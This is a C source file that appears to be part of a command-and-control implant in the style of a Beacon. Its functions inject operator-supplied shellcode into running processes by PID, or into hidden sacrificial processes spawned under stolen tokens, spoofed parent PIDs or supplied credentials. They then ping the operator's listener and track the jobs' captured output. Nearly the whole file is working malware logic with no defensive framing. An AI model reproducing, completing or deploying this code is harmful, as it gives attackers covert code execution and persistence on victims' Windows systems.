/*
* Functions related to spawning and injecting shellcode. Better to group these into one spot.
*/
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"
#include "inlinecommon.h"
#include <WinSock2.h>
#include "jobs.h"

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void command_inject_pid(char * buffer, int length, BOOL x86) {
	HANDLE hProcess = NULL;
	DWORD  pid;
	DWORD  offset;

	/* initialize our data parser */
	datap  parser;
	data_init(&parser, buffer, length);

	/* extract our PID from the data the user provided */
	pid = data_int(&parser);

	/* offset of where we want code execution to start */
	offset = data_int(&parser);

	/* open the process for some oh so subtle manipulation */
	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (hProcess == NULL) {
		post_error_dd(0x21, pid, GetLastError());
		return;
	}

	/* check if the process is x86 or not */
	if (x86 && is_x64_process(hProcess)) {
		post_error_d(0x12, pid);
		return;
	}
	else if (!x86 && !is_x64_process(hProcess)) {
		post_error_d(0x13, pid);
		return;
	}

	/* account for our pid value when we do some injection */
	inject_process_logic(NULL, hProcess, pid, data_buffer(&parser), data_length(&parser), offset, NULL, 0);

	/* we're done... */
	CloseHandle(hProcess);
}

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void command_inject(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	/* do this with something other than the current token */
	token_guard_start_maybe(ignoreToken);

	/* reset some stuff */
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	/* start a process */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = NULL;
	si.hStdError = NULL;
	si.hStdInput = NULL;

	/* spawn our process */
	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
		token_guard_stop_maybe(ignoreToken);
		return;
	}

	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
	Sleep(100);

	/* inject into the process */
	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, buffer, length, 0, NULL, 0);

	/* if we have an impersonated token, restore it */
	token_guard_stop_maybe(ignoreToken);

	/* clean up our process */
	cleanupProcess(&pi);
}

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void command_spawnu(char * buffer, int length, BOOL x86) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	datap               parser;
	char              * payload;
	DWORD               plength;
	DWORD               ppid;

	/* parse it! */
	data_init(&parser, buffer, length);
	ppid    = data_int(&parser);
	payload = data_buffer(&parser);
	plength = data_length(&parser);

	/* reset some stuff */
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	/* start a process */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = NULL;
	si.hStdError = NULL;
	si.hStdInput = NULL;

	/* spawn our process */
	if (!spawn_patsy_u(x86, TRUE, &si, &pi, ppid)) {
		return;
	}

	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
	Sleep(100);

	/* inject into the process */
	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, payload, plength, 0, NULL, 0);

	/* clean up our process */
	cleanupProcess(&pi);
}

void command_spawnas(char * buffer, int length, BOOL x86) {
	PROCESS_INFORMATION proc;
	char * domain;
	char * user;
	char * pass;
	datap * local;
	datap parser;

	/* setup our memory */
	local = data_alloc(1024 * 3);
	domain = data_ptr(local, 1024);
	user = data_ptr(local, 1024);
	pass = data_ptr(local, 1024);

	/* setup our data parser */
	data_init(&parser, buffer, length);

	/* extract our parameters */
	if (!data_string(&parser, domain, 1024)) {
		data_free(local);
		return;
	}

	if (!data_string(&parser, user, 1024)) {
		data_free(local);
		return;
	}

	if (!data_string(&parser, pass, 1024)) {
		data_free(local);
		return;
	}

	if (spawn_patsy_as(x86, domain, user, pass, &proc)) {
		/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
		Sleep(100);

		/* inject into the process */
		inject_process_logic(&proc, proc.hProcess, proc.dwProcessId, data_buffer(&parser), data_length(&parser), 0, NULL, 0);
	}

	/* free our memory */
	data_free(local);

	/* clean up our process */
	cleanupProcess(&proc);
}

/* inject shellcode and then call home to indicate it was done */
void command_inject_ping(char * buffer, int length, BOOL x86, void(*cb)(char * buffer, int length, int type)) {
	unsigned short port = 0;

	/* extract our port value */
	memcpy((void *)&port, buffer, sizeof(unsigned short));
	buffer += sizeof(unsigned short);
	length -= sizeof(unsigned short);
	port = ntohs(port);

	/* inject our shellcode */
	command_inject(buffer, length, x86, TRUE);

	/* phone home... with... our buffer */
	port = htons(port);
	cb((char *)&port, sizeof(unsigned short), CALLBACK_PING);
}

/* inject shellcode and then call home to indicate it was done */
void command_inject_pid_ping(char * buffer, int length, void(*cb)(char * buffer, int length, int type), BOOL x86) {
	unsigned short port = 0;

	/* extract our port value */
	memcpy((void *)&port, buffer, sizeof(unsigned short));
	buffer += sizeof(unsigned short);
	length -= sizeof(unsigned short);
	port = ntohs(port);

	/* inject our shellcode */
	command_inject_pid(buffer, length, x86);

	/* phone home... with... our buffer */
	port = htons(port);
	cb((char *)&port, sizeof(unsigned short), CALLBACK_PING);
}

void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellcode, DWORD slen, char * parameter, DWORD plen, char * description, DWORD dlen, BOOL x86, BOOL ignoreToken) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;
	HANDLE newstdout, read_stdout, hProcess;

	/* drop our token */
	token_guard_start_maybe(ignoreToken);

	/* reset some stuff */
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	/* setup our security attributes (needed for our pipe) */
	sa.lpSecurityDescriptor = 0;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;

	/* we're going to setup an stdout pipe only */
	CreatePipe(&read_stdout, &newstdout, &sa, 1024 * 1024);

	/* further process our startup info data structure */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = newstdout;
	si.hStdError = newstdout;
	si.hStdInput = NULL;

	/* do our spawn logic, please! */
	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
		token_guard_stop_maybe(ignoreToken);
		return;
	}

	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
	Sleep(100);

	/* inject into the process */
	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, shellcode, slen, offset, parameter, plen);

	/* wait the user specified time for our process to complete */
	if (wait > 0) {
		pipe_try(read_stdout, wait);
	}

	/* track this process */
	process_track(pi, read_stdout, newstdout, description);

	/* restore our dropped token (if there is one) */
	token_guard_stop_maybe(ignoreToken);
}

/* omnibus function. Does a little bit of everything? */
void command_job_spawn(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
	datap   parser;
	datap * temp;
	DWORD   type, wait;
	char *  shellcode;
	char *  parameter;
	char *  description;
	DWORD   slen, plen, dlen, offset;

	/* setup our local memory */
	temp = data_alloc(64);
	description = data_ptr(temp, 64);

	/* setup our data parser */
	data_init(&parser, buffer, length);

	/* extract the job output type */
	type = data_short(&parser);

	/* extract the wait time */
	wait = data_short(&parser);

	/* extract the reflective loader offset pls */
	offset = data_int(&parser);

	/* extract our description */
	dlen = data_string(&parser, description, 64);

	/* extract our parameter */
	plen = data_int(&parser);
	if (plen > 0)
		parameter = data_ptr(&parser, plen);
	else
		parameter = NULL;

	/* extract our shellcode */
	shellcode = data_buffer(&parser);
	slen      = data_length(&parser);

	/* call our command spawn logic */
	command_job_spawn_logic(type, wait, offset, shellcode, slen, parameter, plen, description, dlen, x86, ignoreToken);

	/* free our locally allocated memory */
	data_free(temp);
}